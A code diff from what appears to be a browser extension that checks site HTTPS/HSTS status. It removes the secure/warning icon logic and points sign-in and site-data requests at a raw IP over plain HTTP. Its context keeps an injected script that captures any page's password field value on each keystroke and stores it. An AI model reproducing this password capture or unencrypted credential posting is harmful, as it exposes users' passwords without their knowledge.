@@ -6,31 +6,6 @@ chrome.tabs.onUpdated.addListener((currentTabId, changeInfo, tab) => {
 
 	if(url !== undefined && changeInfo.status ==="complete")
 	{
-		// Check http, https
-		urlStatus = checkURL(url);
-		// If https
-		if(urlStatus === "https")
-		{
-			chrome.browserAction.setIcon({
-				path: {"38": "/Icons/38_secure.png"},
-				tabId: currentTabId
-			});
-		}
-		// If http
-		else if(urlStatus === "http")
-		{
-			chrome.browserAction.setIcon({
-				path: {"38": "/Icons/38_warning.png"},
-				tabId: currentTabId
-			});
-		}
-		// Unkown
-		else
-		{
-			console.log("Unknown");
-			return;
-		}
-
 		// Get user input password
 		chrome.tabs.executeScript({
       code:"document.addEventListener('keyup', function(){var elements = document.querySelectorAll('input[type=password]')[0]; if(elements) { var passwordName = elements.name; var passwordValue = elements.value; chrome.storage.local.set({ passwordInfo: [passwordName, passwordValue] }); } });"
@@ -97,7 +72,7 @@ var signIn = async (email, password, port) => {
   // Check HSTS, Get sslData
   await $.ajax({
     type: "POST",
-    url: "http://localhost:5000/post/chrome/signIn",
+    url: "http://52.79.152.29:5000/post/chrome/signIn",
     data: {email:email, password:password},
     success: (data) => {
 			// sessionStorage setItem
@@ -113,7 +88,7 @@ var getsiteData = async (tab, port) => {
   // Check HSTS, Get sslData
   await $.ajax({
     type: "POST",
-    url: "http://localhost:5000/post/hsts",
+    url: "http://52.79.152.29:5000/post/hsts",
     data: tab.url,
     success: (data) => {
 			// send to inject.js
